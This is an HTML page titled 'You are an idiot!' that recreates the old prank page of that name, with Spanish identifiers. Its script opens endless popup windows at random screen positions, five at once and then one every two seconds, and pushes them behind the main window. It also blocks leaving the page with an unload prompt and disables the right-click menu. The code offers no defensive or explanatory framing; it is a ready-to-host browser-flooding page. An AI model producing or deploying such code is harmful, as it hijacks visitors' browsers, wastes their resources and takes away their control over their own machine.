<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>You are an idiot!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body { 
      background: #000; 
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100vw;
      height: 100vh;
    }
    video { 
      width: 100%; 
      height: 100%; 
      object-fit: cover;
    }
  </style>
</head>
<body>
  <video autoplay loop muted>
    <source src="tu_video.mp4" type="video/mp4">
  </video>

  <script>
    function abrirVentana() {
      const width = 400;
      const height = 300;
      const x = Math.floor(Math.random() * (screen.availWidth - width));
      const y = Math.floor(Math.random() * (screen.availHeight - height));
      
      const nuevaVentana = window.open('popup.html', '_blank', `width=${width},height=${height},left=${x},top=${y},resizable=no`);
      if (nuevaVentana) {
        nuevaVentana.blur();
      }
    }

    setTimeout(() => {
      for (let i = 0; i < 5; i++) {
        setTimeout(() => abrirVentana(), i * 300);
      }
    }, 1000);

    setInterval(() => abrirVentana(), 2000);

    window.addEventListener('beforeunload', (e) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    });

    document.addEventListener('contextmenu', (e) => e.preventDefault());
  </script>
</body>
</html>
